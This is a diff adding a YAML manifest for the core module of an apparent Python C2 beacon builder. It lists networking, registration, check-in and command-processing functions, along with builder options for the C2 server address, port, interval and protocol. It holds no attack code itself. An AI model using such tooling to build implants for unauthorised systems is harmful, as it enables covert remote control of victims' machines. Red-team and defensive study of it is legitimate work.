@@ -1,0 +1,68 @@
+module:
+  id: core
+  version: "1.0.0"
+  display_name: "Core"
+  description: "Core Python beacon infrastructure - networking, registration, check-in"
+
+  # Core has no external dependencies
+  requires: []
+
+  # What the core provides
+  provides:
+    - PythonBeacon
+    - send_message
+    - send_tcp
+    - send_udp
+    - send_smb
+    - send_http
+    - register
+    - request_action
+    - send_checkin
+    - send_command_output
+    - process_command
+    - run
+    - log
+    - generate_agent_id
+
+  # Core files in inclusion order
+  files:
+    - header.py
+    - logging.py
+    - network_base.py
+    - registration.py
+    - checkin.py
+    - main.py
+
+  # Core doesn't add dispatch entries (modules do)
+  dispatch: {}
+
+  # Core doesn't contribute to schema (modules do)
+  schema: {}
+
+  # Builder UI options for core configuration
+  config_options:
+    server_ip:
+      type: text
+      default: "127.0.0.1"
+      label: "Server IP"
+      description: "C2 server IP address"
+    server_port:
+      type: integer
+      default: 5074
+      label: "Server Port"
+      description: "C2 server port"
+    checkin_interval:
+      type: integer
+      default: 15
+      label: "Check-in Interval (seconds)"
+      description: "How often the beacon checks in"
+    default_protocol:
+      type: choice
+      default: "tcp"
+      label: "Default Protocol"
+      description: "Default communication protocol"
+      choices:
+        - tcp
+        - udp
+        - smb
+        - http
